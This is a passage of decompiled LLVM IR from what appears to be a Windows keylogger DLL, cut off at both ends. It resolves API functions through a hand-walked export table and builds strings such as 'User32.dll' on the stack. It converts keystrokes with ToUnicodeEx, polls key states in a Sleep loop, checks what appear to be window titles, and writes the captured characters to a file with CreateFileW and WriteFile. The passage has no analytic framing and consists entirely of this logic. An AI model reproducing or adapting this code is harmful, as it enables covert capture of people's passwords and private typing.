  %7 = call i32 @___std_exception_copy(), !insn.addr !605
  store i32 ptrtoint (%vtable_1002d354_type* @global_var_1002d354 to i32), i32* %4, align 4, !insn.addr !606
  %8 = add i32 %arg1, 12, !insn.addr !607
  %9 = inttoptr i32 %8 to i32*, !insn.addr !607
  %10 = load i32, i32* %9, align 4, !insn.addr !607
  %11 = add i32 %0, 12, !insn.addr !608
  %12 = inttoptr i32 %11 to i32*, !insn.addr !608
  store i32 %10, i32* %12, align 4, !insn.addr !608
  %13 = add i32 %arg1, 16, !insn.addr !609
  %14 = inttoptr i32 %13 to i32*, !insn.addr !609
  %15 = load i32, i32* %14, align 4, !insn.addr !609
  %16 = add i32 %0, 16, !insn.addr !610
  %17 = inttoptr i32 %16 to i32*, !insn.addr !610
  store i32 %15, i32* %17, align 4, !insn.addr !610
  ret i32 %0, !insn.addr !611
}

define i32 @function_10001ff0() local_unnamed_addr {
dec_label_pc_10001ff0:
  %storemerge.reg2mem = alloca i32, !insn.addr !612
  %edx.0.reg2mem = alloca i32, !insn.addr !612
  %.pre-phi.reg2mem = alloca i32, !insn.addr !612
  %ecx.2.reg2mem = alloca i32, !insn.addr !612
  %ecx.1.reg2mem = alloca i32, !insn.addr !612
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !612
  %ecx.0.reg2mem = alloca i32, !insn.addr !612
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-140 = alloca i128, align 8
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-156 = alloca i16*, align 4
  %1 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-40 = alloca i16*, align 4
  %2 = call i16* @__decompiler_undefined_function_8()
  %stack_var_-4 = alloca i32, align 4
  %3 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !613
  %4 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !614
  %5 = xor i32 %4, %3, !insn.addr !615
  store i32 1919251285, i32* @global_var_1003ff30, align 4, !insn.addr !616
  store i32 1680749107, i32* @global_var_1003ff34, align 4, !insn.addr !617
  store i16 27756, i16* bitcast (i32* @global_var_1003ff38 to i16*), align 4, !insn.addr !618
  store i8 0, i8* bitcast (i32* @global_var_1003ff3a to i8*), align 4, !insn.addr !619
  %6 = load i128, i128* @global_var_10039c00, align 4, !insn.addr !620
  %7 = call i128 @__asm_movaps(i128 %6), !insn.addr !620
  %8 = load i128, i128* bitcast (i32* @global_var_1003ff30 to i128*), align 4, !insn.addr !621
  call void @__asm_movups(i128 %8, i128 %7), !insn.addr !621
  store i32 7827300, i32* @global_var_1003ff40, align 4, !insn.addr !622
  %9 = add i32 %5, 60, !insn.addr !623
  %10 = inttoptr i32 %9 to i32*, !insn.addr !623
  %11 = load i32, i32* %10, align 4, !insn.addr !623
  %12 = add i32 %5, 120, !insn.addr !624
  %13 = add i32 %12, %11, !insn.addr !624
  %14 = inttoptr i32 %13 to i32*, !insn.addr !624
  %15 = load i32, i32* %14, align 4, !insn.addr !624
  %16 = add i32 %15, %5, !insn.addr !625
  %17 = call i32 @function_10009e60(i32 %5, i32* nonnull @global_var_1003ff30), !insn.addr !626
  %18 = add i32 %16, 36, !insn.addr !627
  %19 = inttoptr i32 %18 to i32*, !insn.addr !627
  %20 = load i32, i32* %19, align 4, !insn.addr !627
  %21 = mul i32 %17, 2, !insn.addr !628
  %22 = add i32 %21, %5, !insn.addr !628
  %23 = add i32 %22, %20, !insn.addr !629
  %24 = inttoptr i32 %23 to i16*, !insn.addr !629
  %25 = load i16, i16* %24, align 2, !insn.addr !629
  %26 = zext i16 %25 to i32, !insn.addr !629
  %27 = add i32 %16, 28, !insn.addr !630
  %28 = inttoptr i32 %27 to i32*, !insn.addr !630
  %29 = load i32, i32* %28, align 4, !insn.addr !630
  %30 = mul i32 %26, 4, !insn.addr !631
  %31 = add i32 %29, %5, !insn.addr !631
  %32 = add i32 %31, %30, !insn.addr !632
  %33 = inttoptr i32 %32 to i32*, !insn.addr !632
  %34 = load i32, i32* %33, align 4, !insn.addr !632
  %35 = add i32 %34, %5, !insn.addr !633
  %36 = load i128, i128* @global_var_10039aa0, align 4, !insn.addr !634
  %37 = call i128 @__asm_movaps(i128 %36), !insn.addr !634
  %38 = load i128, i128* bitcast (i32* @global_var_1003ff30 to i128*), align 4, !insn.addr !635
  call void @__asm_movups(i128 %38, i128 %37), !insn.addr !635
  store i32 1701015410, i32* @global_var_1003ff40, align 4, !insn.addr !636
  store i32 1682535283, i32* @global_var_1003ff44, align 4, !insn.addr !637
  store i8 0, i8* bitcast (i32* @global_var_1003ff48 to i8*), align 4, !insn.addr !638
  store i32 %35, i32* @global_var_10040024, align 4, !insn.addr !639
  %39 = call i32 @function_10009e60(i32 %5, i32* nonnull @global_var_1003ff30), !insn.addr !640
  %40 = call i32 @_malloc(), !insn.addr !641
  %41 = load i128, i128* @global_var_10039b50, align 4, !insn.addr !642
  %42 = call i128 @__asm_movaps(i128 %41), !insn.addr !642
  store i8 0, i8* bitcast (i32* @global_var_1003ff40 to i8*), align 4, !insn.addr !643
  %43 = load i128, i128* bitcast (i32* @global_var_1003ff30 to i128*), align 4, !insn.addr !644
  call void @__asm_movups(i128 %43, i128 %42), !insn.addr !644
  %44 = call i32 @function_10009390(), !insn.addr !645
  %45 = load i128, i128* @global_var_10039c60, align 4, !insn.addr !646
  %46 = call i128 @__asm_movaps(i128 %45), !insn.addr !646
  store i16 116, i16* bitcast (i32* @global_var_1003ff40 to i16*), align 4, !insn.addr !647
  %47 = load i128, i128* bitcast (i32* @global_var_1003ff30 to i128*), align 4, !insn.addr !648
  call void @__asm_movups(i128 %47, i128 %46), !insn.addr !648
  %48 = call i32 @function_10009390(), !insn.addr !649
  %49 = call i128 @__asm_xorps(i128 %46, i128 %46), !insn.addr !650
  %sext = mul i32 %0, 65536
  %50 = sdiv i32 %sext, 65536, !insn.addr !651
  %51 = ptrtoint i16* %2 to i32
  %52 = zext i32 %51 to i128, !insn.addr !652
  call void @__asm_movups(i128 %52, i128 %49), !insn.addr !652
  call void @__asm_movups(i128 %1, i128 %49), !insn.addr !653
  %53 = call i32 @MapVirtualKeyExW(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !654
  %54 = inttoptr i32 %53 to i16*, !insn.addr !655
  store i16* %54, i16** %stack_var_-156, align 4, !insn.addr !655
  %55 = bitcast i16** %stack_var_-40 to i16*
  %56 = inttoptr i32 %40 to i8*, !insn.addr !656
  %57 = inttoptr i32 %48 to i32*, !insn.addr !657
  %58 = call i32 @ToUnicodeEx(i32 %53, i32 %50, i8* %56, i16* nonnull %55, i32 16, i32 0, i32* %57), !insn.addr !657
  store i32 16, i32* %stack_var_-236, align 4, !insn.addr !658
  %59 = trunc i32 %58 to i16, !insn.addr !659
  %60 = icmp eq i16 %59, 0, !insn.addr !659
  store i32* %stack_var_-236, i32** %esp.0.in.reg2mem, !insn.addr !660
  br i1 %60, label %dec_label_pc_10002225, label %dec_label_pc_100021ba, !insn.addr !660

dec_label_pc_100021ba:                            ; preds = %dec_label_pc_10001ff0
  %61 = call i128 @__asm_movaps(i128 7368320664886723658192474275931), !insn.addr !661
  %62 = load i128, i128* %stack_var_-140, align 8, !insn.addr !662
  call void @__asm_movups(i128 %62, i128 %61), !insn.addr !662
  %63 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !663
  %64 = ptrtoint i32* %63 to i32, !insn.addr !663
  %65 = ptrtoint i128* %stack_var_-140 to i32, !insn.addr !664
  store i32 %64, i32* @global_var_1003d9b0, align 4, !insn.addr !665
  store i32 %65, i32* %ecx.0.reg2mem, !insn.addr !666
  br label %dec_label_pc_100021f5, !insn.addr !666

dec_label_pc_100021f5:                            ; preds = %dec_label_pc_100021f5, %dec_label_pc_100021ba
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %66 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !667
  %67 = load i16, i16* %66, align 2, !insn.addr !667
  %68 = add i32 %ecx.0.reload, 2, !insn.addr !668
  %69 = icmp eq i16 %67, 0, !insn.addr !669
  %70 = icmp eq i1 %69, false, !insn.addr !670
  store i32 %68, i32* %ecx.0.reg2mem, !insn.addr !670
  br i1 %70, label %dec_label_pc_100021f5, label %dec_label_pc_10002200, !insn.addr !670

dec_label_pc_10002200:                            ; preds = %dec_label_pc_100021f5
  %71 = ptrtoint i32* %stack_var_-138 to i32, !insn.addr !671
  %72 = sub i32 %68, %71, !insn.addr !672
  %73 = bitcast i128* %stack_var_-140 to i32*, !insn.addr !673
  %74 = call i1 @WriteFile(i32* %63, i32* nonnull %73, i32 %72, i32* nonnull @global_var_10040020, %_OVERLAPPED* null), !insn.addr !673
  %75 = load i32, i32* @global_var_1003d9b0, align 4, !insn.addr !674
  store i32 %75, i32* %stack_var_-288, align 4, !insn.addr !674
  %76 = inttoptr i32 %75 to i32*, !insn.addr !675
  %77 = call i1 @CloseHandle(i32* %76), !insn.addr !675
  store i32* %stack_var_-288, i32** %esp.0.in.reg2mem, !insn.addr !675
  br label %dec_label_pc_10002225, !insn.addr !675

dec_label_pc_10002225:                            ; preds = %dec_label_pc_10002200, %dec_label_pc_10001ff0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %78 = icmp eq i32 %58, 0, !insn.addr !676
  %79 = add i32 %esp.0, -4, !insn.addr !677
  %80 = inttoptr i32 %79 to i32*, !insn.addr !677
  store i32 0, i32* %80, align 4, !insn.addr !677
  %81 = add i32 %esp.0, -8, !insn.addr !678
  %82 = inttoptr i32 %81 to i32*, !insn.addr !678
  store i32 128, i32* %82, align 4, !insn.addr !678
  %83 = add i32 %esp.0, -12, !insn.addr !679
  %84 = inttoptr i32 %83 to i32*, !insn.addr !679
  store i32 4, i32* %84, align 4, !insn.addr !679
  %85 = add i32 %esp.0, -16, !insn.addr !680
  %86 = inttoptr i32 %85 to i32*, !insn.addr !680
  store i32 0, i32* %86, align 4, !insn.addr !680
  %87 = add i32 %esp.0, -20, !insn.addr !681
  %88 = inttoptr i32 %87 to i32*, !insn.addr !681
  store i32 1, i32* %88, align 4, !insn.addr !681
  %89 = add i32 %esp.0, -24, !insn.addr !682
  %90 = inttoptr i32 %89 to i32*, !insn.addr !682
  store i32 4, i32* %90, align 4, !insn.addr !682
  %91 = add i32 %esp.0, -28, !insn.addr !683
  %92 = inttoptr i32 %91 to i32*, !insn.addr !683
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %92, align 4, !insn.addr !683
  br i1 %78, label %dec_label_pc_1000226d, label %dec_label_pc_10002242, !insn.addr !684

dec_label_pc_10002242:                            ; preds = %dec_label_pc_10002225
  %93 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !685
  %94 = ptrtoint i32* %93 to i32, !insn.addr !685
  %95 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %94, i32* @global_var_1003d9b0, align 4, !insn.addr !686
  store i32 %95, i32* %ecx.1.reg2mem, !insn.addr !687
  br label %dec_label_pc_10002252, !insn.addr !687

dec_label_pc_10002252:                            ; preds = %dec_label_pc_10002252, %dec_label_pc_10002242
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %96 = inttoptr i32 %ecx.1.reload to i16*, !insn.addr !688
  %97 = load i16, i16* %96, align 2, !insn.addr !688
  %98 = add i32 %ecx.1.reload, 2, !insn.addr !689
  %99 = icmp eq i16 %97, 0, !insn.addr !690
  %100 = icmp eq i1 %99, false, !insn.addr !691
  store i32 %98, i32* %ecx.1.reg2mem, !insn.addr !691
  br i1 %100, label %dec_label_pc_10002252, label %dec_label_pc_1000225d, !insn.addr !691

dec_label_pc_1000225d:                            ; preds = %dec_label_pc_10002252
  %101 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !687
  %102 = sub i32 %98, %101, !insn.addr !692
  %103 = add i32 %esp.0, -32, !insn.addr !693
  %104 = inttoptr i32 %103 to i32*, !insn.addr !693
  store i32 0, i32* %104, align 4, !insn.addr !693
  %105 = add i32 %esp.0, -36, !insn.addr !694
  %106 = inttoptr i32 %105 to i32*, !insn.addr !694
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %106, align 4, !insn.addr !694
  %107 = add i32 %esp.0, -40, !insn.addr !695
  %108 = inttoptr i32 %107 to i32*, !insn.addr !695
  store i32 %102, i32* %108, align 4, !insn.addr !695
  store i32 %95, i32* %.pre-phi.reg2mem, !insn.addr !696
  store i32 %94, i32* %edx.0.reg2mem, !insn.addr !696
  store i32 %107, i32* %storemerge.reg2mem, !insn.addr !696
  br label %dec_label_pc_100022a0, !insn.addr !696

dec_label_pc_1000226d:                            ; preds = %dec_label_pc_10002225
  %109 = load i16*, i16** %stack_var_-156, align 4
  %110 = ptrtoint i16* %109 to i32
  %111 = bitcast i16** %stack_var_-40 to i32*
  store i32 %110, i32* %111, align 4
  %112 = call i32* @CreateFileW(i16* %109, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !697
  %113 = ptrtoint i32* %112 to i32, !insn.addr !697
  %114 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %113, i32* @global_var_1003d9b0, align 4, !insn.addr !698
  store i32 %114, i32* %ecx.2.reg2mem, !insn.addr !699
  br label %dec_label_pc_10002286, !insn.addr !699

dec_label_pc_10002286:                            ; preds = %dec_label_pc_10002286, %dec_label_pc_1000226d
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %115 = inttoptr i32 %ecx.2.reload to i16*, !insn.addr !700
  %116 = load i16, i16* %115, align 2, !insn.addr !700
  %117 = add i32 %ecx.2.reload, 2, !insn.addr !701
  %118 = icmp eq i16 %116, 0, !insn.addr !702
  %119 = icmp eq i1 %118, false, !insn.addr !703
  store i32 %117, i32* %ecx.2.reg2mem, !insn.addr !703
  br i1 %119, label %dec_label_pc_10002286, label %dec_label_pc_10002291, !insn.addr !703

dec_label_pc_10002291:                            ; preds = %dec_label_pc_10002286
  %120 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !699
  %121 = sub i32 %117, %120, !insn.addr !704
  %122 = add i32 %esp.0, -32, !insn.addr !705
  %123 = inttoptr i32 %122 to i32*, !insn.addr !705
  store i32 0, i32* %123, align 4, !insn.addr !705
  %124 = add i32 %esp.0, -36, !insn.addr !706
  %125 = inttoptr i32 %124 to i32*, !insn.addr !706
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %125, align 4, !insn.addr !706
  %126 = add i32 %esp.0, -40, !insn.addr !707
  %127 = inttoptr i32 %126 to i32*, !insn.addr !707
  store i32 %121, i32* %127, align 4, !insn.addr !707
  store i32 %114, i32* %.pre-phi.reg2mem, !insn.addr !707
  store i32 %113, i32* %edx.0.reg2mem, !insn.addr !707
  store i32 %126, i32* %storemerge.reg2mem, !insn.addr !707
  br label %dec_label_pc_100022a0, !insn.addr !707

dec_label_pc_100022a0:                            ; preds = %dec_label_pc_10002291, %dec_label_pc_1000225d
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %128 = add i32 %storemerge.reload, -4, !insn.addr !708
  %129 = inttoptr i32 %128 to i32*, !insn.addr !708
  store i32 %.pre-phi.reload, i32* %129, align 4, !insn.addr !708
  %130 = add i32 %storemerge.reload, -8, !insn.addr !709
  %131 = inttoptr i32 %130 to i32*, !insn.addr !709
  store i32 %edx.0.reload, i32* %131, align 4, !insn.addr !709
  %132 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !710
  %133 = load i32, i32* @global_var_1003d9b0, align 4, !insn.addr !711
  %134 = add i32 %storemerge.reload, -12, !insn.addr !711
  %135 = inttoptr i32 %134 to i32*, !insn.addr !711
  store i32 %133, i32* %135, align 4, !insn.addr !711
  %136 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !712
  %137 = add i32 %storemerge.reload, -16, !insn.addr !713
  %138 = inttoptr i32 %137 to i32*, !insn.addr !713
  store i32 %40, i32* %138, align 4, !insn.addr !713
  call void @_free(i32* nonnull @1), !insn.addr !714
  %139 = call i32 @"@__security_check_cookie@4"(), !insn.addr !715
  ret i32 %139, !insn.addr !716
}

define i32 @function_100022d0() local_unnamed_addr {
dec_label_pc_100022d0:
  %esp.0.be.reg2mem = alloca i32, !insn.addr !717
  %esp.6.reg2mem = alloca i32, !insn.addr !717
  %.pre-phi.reg2mem = alloca i32, !insn.addr !717
  %esp.5.reg2mem = alloca i32, !insn.addr !717
  %esp.4.reg2mem = alloca i32, !insn.addr !717
  %edx.6.reg2mem = alloca i32, !insn.addr !717
  %.pn.reg2mem = alloca i32, !insn.addr !717
  %ecx.16.reg2mem = alloca i32, !insn.addr !717
  %ecx.15.reg2mem = alloca i32, !insn.addr !717
  %ecx.14.reg2mem = alloca i32, !insn.addr !717
  %ecx.13.reg2mem = alloca i32, !insn.addr !717
  %ecx.12.reg2mem = alloca i32, !insn.addr !717
  %ecx.11.reg2mem = alloca i32, !insn.addr !717
  %ecx.10.reg2mem = alloca i32, !insn.addr !717
  %ecx.9.reg2mem = alloca i32, !insn.addr !717
  %ecx.8.reg2mem = alloca i32, !insn.addr !717
  %ecx.7.reg2mem = alloca i32, !insn.addr !717
  %ecx.6.reg2mem = alloca i32, !insn.addr !717
  %ecx.5.reg2mem = alloca i32, !insn.addr !717
  %ecx.4.reg2mem = alloca i32, !insn.addr !717
  %esp.3.reg2mem = alloca i32, !insn.addr !717
  %ecx.3.reg2mem = alloca i32, !insn.addr !717
  %eax.2.reg2mem = alloca i32, !insn.addr !717
  %esp.2.reg2mem = alloca i32, !insn.addr !717
  %ecx.0.reg2mem = alloca i32, !insn.addr !717
  %eax.1.reg2mem = alloca i32, !insn.addr !717
  %esp.1.reg2mem = alloca i32, !insn.addr !717
  %eax.0.reg2mem = alloca i32, !insn.addr !717
  %stack_var_-216.0.reg2mem = alloca i16*, !insn.addr !717
  %esp.0.reg2mem = alloca i32, !insn.addr !717
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-108 = alloca i128, align 8
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-208 = alloca i128, align 8
  store i128 1919251285, i128* %stack_var_-208, align 8, !insn.addr !718
  %1 = ptrtoint i128* %stack_var_-208 to i32, !insn.addr !719
  store i32 %1, i32* %stack_var_-240, align 4, !insn.addr !719
  %2 = load i128, i128* @global_var_10039b60, align 4, !insn.addr !720
  %3 = call i128 @__asm_movaps(i128 %2), !insn.addr !720
  call void @__asm_movups(i128 undef, i128 %3), !insn.addr !721
  %4 = add i32 %0, 120, !insn.addr !722
  %5 = add i32 %4, %1, !insn.addr !722
  %6 = inttoptr i32 %5 to i32*, !insn.addr !722
  %7 = load i32, i32* %6, align 4, !insn.addr !722
  %8 = add i32 %7, %1, !insn.addr !723
  %9 = bitcast i128* %stack_var_-208 to i32*, !insn.addr !724
  %10 = call i32 @function_10009e60(i32 %1, i32* nonnull %9), !insn.addr !724
  %11 = add i32 %8, 36, !insn.addr !725
  %12 = inttoptr i32 %11 to i32*, !insn.addr !725
  %13 = load i32, i32* %12, align 4, !insn.addr !725
  %14 = load i128, i128* @global_var_10039c00, align 4, !insn.addr !726
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !726
  %16 = mul i32 %10, 2, !insn.addr !727
  %17 = add i32 %16, %1, !insn.addr !727
  %18 = add i32 %17, %13, !insn.addr !728
  %19 = inttoptr i32 %18 to i16*, !insn.addr !728
  %20 = load i16, i16* %19, align 2, !insn.addr !728
  %21 = zext i16 %20 to i32, !insn.addr !728
  %22 = add i32 %8, 28, !insn.addr !729
  %23 = inttoptr i32 %22 to i32*, !insn.addr !729
  %24 = load i32, i32* %23, align 4, !insn.addr !729
  %25 = mul i32 %21, 4, !insn.addr !730
  %26 = add i32 %24, %1, !insn.addr !730
  %27 = add i32 %26, %25, !insn.addr !731
  %28 = inttoptr i32 %27 to i32*, !insn.addr !731
  %29 = load i32, i32* %28, align 4, !insn.addr !731
  %30 = add i32 %29, %1, !insn.addr !732
  call void @__asm_movups(i128 undef, i128 %15), !insn.addr !733
  store i32 %30, i32* @global_var_10040034, align 4, !insn.addr !734
  %31 = call i32 @function_10009e60(i32 %1, i32* nonnull %9), !insn.addr !735
  %32 = ptrtoint i32* %stack_var_-240 to i32, !insn.addr !736
  store i128 1467245895, i128* %stack_var_-208, align 8, !insn.addr !737
  %33 = call i32 @function_10009390(), !insn.addr !738
  %34 = ptrtoint i128* %stack_var_-108 to i32
  %35 = ptrtoint i32* %stack_var_-106 to i32
  %36 = load i128, i128* @global_var_10039930, align 4
  %37 = load i128, i128* @global_var_10039950, align 4
  %38 = load i128, i128* @global_var_10039920, align 4
  %39 = load i128, i128* @global_var_10039940, align 4
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !739
  br label %dec_label_pc_10002410, !insn.addr !739

dec_label_pc_10002410:                            ; preds = %dec_label_pc_10002410.backedge, %dec_label_pc_100022d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %40 = add i32 %esp.0.reload, -4, !insn.addr !740
  %41 = inttoptr i32 %40 to i32*, !insn.addr !740
  store i32 30, i32* %41, align 4, !insn.addr !740
  call void @Sleep(i32 %33), !insn.addr !741
  store i16* inttoptr (i32 8 to i16*), i16** %stack_var_-216.0.reg2mem, !insn.addr !742
  store i32 8, i32* %eax.0.reg2mem, !insn.addr !742
  store i32 %40, i32* %esp.1.reg2mem, !insn.addr !742
  br label %dec_label_pc_10002423, !insn.addr !742

dec_label_pc_10002423:                            ; preds = %dec_label_pc_10002dcf, %dec_label_pc_10002410
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %stack_var_-216.0.reload = load i16*, i16** %stack_var_-216.0.reg2mem
  %sext = mul i32 %eax.0.reload, 65536
  %42 = sdiv i32 %sext, 65536, !insn.addr !743
  %43 = add i32 %esp.1.reload, -4, !insn.addr !744
  %44 = inttoptr i32 %43 to i32*, !insn.addr !744
  store i32 %42, i32* %44, align 4, !insn.addr !744
  %45 = trunc i32 %42 to i16, !insn.addr !745
  %46 = icmp eq i16 %45, -32767, !insn.addr !745
  %47 = icmp eq i1 %46, false, !insn.addr !746
  br i1 %47, label %dec_label_pc_10002423.dec_label_pc_10002dcf_crit_edge, label %dec_label_pc_10002439, !insn.addr !746

dec_label_pc_10002423.dec_label_pc_10002dcf_crit_edge: ; preds = %dec_label_pc_10002423
  %.pre = ptrtoint i16* %stack_var_-216.0.reload to i32, !insn.addr !747
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %43, i32* %esp.6.reg2mem
  br label %dec_label_pc_10002dcf

dec_label_pc_10002439:                            ; preds = %dec_label_pc_10002423
  store i32 %42, i32* @global_var_10040024, align 4, !insn.addr !748
  %48 = icmp eq i32 %sext, 0, !insn.addr !749
  store i32 %43, i32* %esp.3.reg2mem, !insn.addr !750
  br i1 %48, label %dec_label_pc_1000259e, label %dec_label_pc_1000244c, !insn.addr !750

dec_label_pc_1000244c:                            ; preds = %dec_label_pc_10002439
  %49 = add i32 %esp.1.reload, -8, !insn.addr !751
  %50 = inttoptr i32 %49 to i32*, !insn.addr !751
  store i32 1024, i32* %50, align 4, !insn.addr !751
  %51 = add i32 %esp.1.reload, -12, !insn.addr !752
  %52 = inttoptr i32 %51 to i32*, !insn.addr !752
  store i32 ptrtoint (i16** @global_var_1003f510 to i32), i32* %52, align 4, !insn.addr !752
  %53 = add i32 %esp.1.reload, -16, !insn.addr !753
  %54 = inttoptr i32 %53 to i32*, !insn.addr !753
  store i32 %42, i32* %54, align 4, !insn.addr !753
  store i32 ptrtoint (i16** @global_var_1003f510 to i32), i32* %eax.1.reg2mem, !insn.addr !754
  store i32 ptrtoint (i16** @global_var_10040038 to i32), i32* %ecx.0.reg2mem, !insn.addr !754
  br label %dec_label_pc_10002470, !insn.addr !754

dec_label_pc_10002470:                            ; preds = %dec_label_pc_10002487, %dec_label_pc_1000244c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %55 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !755
  %56 = load i16, i16* %55, align 4, !insn.addr !755
  %57 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !756
  %58 = load i16, i16* %57, align 4, !insn.addr !756
  %59 = icmp eq i16 %56, %58, !insn.addr !756
  %60 = icmp eq i1 %59, false, !insn.addr !757
  br i1 %60, label %dec_label_pc_100024a3, label %dec_label_pc_10002478, !insn.addr !757

dec_label_pc_10002478:                            ; preds = %dec_label_pc_10002470
  %61 = icmp eq i16 %56, 0, !insn.addr !758
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !759
  br i1 %61, label %dec_label_pc_1000259e, label %dec_label_pc_1000247d, !insn.addr !759

dec_label_pc_1000247d:                            ; preds = %dec_label_pc_10002478
  %62 = or i32 %eax.1.reload, 2, !insn.addr !760
  %63 = inttoptr i32 %62 to i16*, !insn.addr !760
  %64 = load i16, i16* %63, align 2, !insn.addr !760
  %65 = or i32 %ecx.0.reload, 2, !insn.addr !761
  %66 = inttoptr i32 %65 to i16*, !insn.addr !761
  %67 = load i16, i16* %66, align 2, !insn.addr !761
  %68 = icmp eq i16 %64, %67, !insn.addr !761
  %69 = icmp eq i1 %68, false, !insn.addr !762
  br i1 %69, label %dec_label_pc_100024a3, label %dec_label_pc_10002487, !insn.addr !762

dec_label_pc_10002487:                            ; preds = %dec_label_pc_1000247d
  %70 = add i32 %eax.1.reload, 4, !insn.addr !763
  %71 = add i32 %ecx.0.reload, 4, !insn.addr !764
  %72 = icmp eq i16 %64, 0, !insn.addr !765
  %73 = icmp eq i1 %72, false, !insn.addr !766
  store i32 %70, i32* %eax.1.reg2mem, !insn.addr !766
  store i32 %71, i32* %ecx.0.reg2mem, !insn.addr !766
  store i32 %53, i32* %esp.3.reg2mem, !insn.addr !766
  br i1 %73, label %dec_label_pc_10002470, label %dec_label_pc_1000259e, !insn.addr !766

dec_label_pc_100024a3:                            ; preds = %dec_label_pc_1000247d, %dec_label_pc_10002470
  %74 = load i32, i32* @global_var_1003f508, align 4, !insn.addr !767
  %75 = icmp eq i32 %74, 0, !insn.addr !767
  %76 = add i32 %esp.1.reload, -20, !insn.addr !768
  %77 = inttoptr i32 %76 to i32*, !insn.addr !768
  store i32 0, i32* %77, align 4, !insn.addr !768
  %78 = add i32 %esp.1.reload, -24, !insn.addr !769
  %79 = inttoptr i32 %78 to i32*, !insn.addr !769
  store i32 128, i32* %79, align 4, !insn.addr !769
  %80 = add i32 %esp.1.reload, -28
  %81 = inttoptr i32 %80 to i32*
  br i1 %75, label %dec_label_pc_100024e4, label %dec_label_pc_100024b3, !insn.addr !770

dec_label_pc_100024b3:                            ; preds = %dec_label_pc_100024a3
  store i32 2, i32* %81, align 4, !insn.addr !771
  %82 = add i32 %esp.1.reload, -32, !insn.addr !772
  %83 = inttoptr i32 %82 to i32*, !insn.addr !772
  store i32 0, i32* %83, align 4, !insn.addr !772
  %84 = add i32 %esp.1.reload, -36, !insn.addr !773
  %85 = inttoptr i32 %84 to i32*, !insn.addr !773
  store i32 2, i32* %85, align 4, !insn.addr !773
  %86 = add i32 %esp.1.reload, -40, !insn.addr !774
  %87 = inttoptr i32 %86 to i32*, !insn.addr !774
  store i32 2, i32* %87, align 4, !insn.addr !774
  %88 = add i32 %esp.1.reload, -44, !insn.addr !775
  %89 = inttoptr i32 %88 to i32*, !insn.addr !775
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %89, align 4, !insn.addr !775
  %90 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !776
  %91 = ptrtoint i32* %90 to i32, !insn.addr !776
  %92 = add i32 %esp.1.reload, -48, !insn.addr !777
  %93 = inttoptr i32 %92 to i32*, !insn.addr !777
  store i32 0, i32* %93, align 4, !insn.addr !777
  %94 = add i32 %esp.1.reload, -52, !insn.addr !778
  %95 = inttoptr i32 %94 to i32*, !insn.addr !778
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %95, align 4, !insn.addr !778
  %96 = add i32 %esp.1.reload, -56, !insn.addr !779
